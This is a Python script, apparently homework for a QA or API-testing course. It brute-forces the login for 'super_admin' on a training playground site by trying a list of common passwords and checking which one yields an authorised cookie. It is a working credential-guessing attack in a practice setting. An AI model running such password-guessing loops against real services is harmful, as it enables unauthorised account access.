import requests
import time
import json

passwords_values = ["password", "1234", "12345", "123456", "1234567", "12345678", "123456789", "1234567890", "111111",
                    "123123", "qwerty", "qwerty123", "abc123", "football", "monkey", "letmein", "dragon", "baseball",
                    "sunshine", "iloveyou", "trustno1", "princess", "adobe123", "welcome", "login", "admin", "solo",
                    "1q2w3e4r", "master", "666666", "qwertyuiop", "ashley", "mustang", "121212", "starwars", "654321",
                    "bailey", "access", "flower", "555555", "passw0rd", "shadow", "lovely", "7777777", "michael",
                    "jesus", "password1", "superman", "hello", "charlie", "888888", "696969", "hottie", "freedom",
                    "aa123456", "qazwsx", "ninja", "azerty", "loveme", "whatever", "donald", "batman", "zaq1zaq1",
                    "Football", "000000"]
for current_password in passwords_values:
    data = {"login": 'super_admin', "password": current_password}
    # print(data)
    url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
    response1 = requests.post(url, data=data)
    cookie_value = response1.cookies.get('auth_cookie')
    cookies = {'auth_cookie': cookie_value}
    # print(response1.status_code)
    # print(response1.text)
    # print(cookie_value)

    url2 = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
    response2 = requests.get(url2, cookies=cookies)
    # print(response2.status_code)
    # print(response2.text)

    if response2.text != 'You are NOT authorized':
        print(current_password)
        print(response2.text)


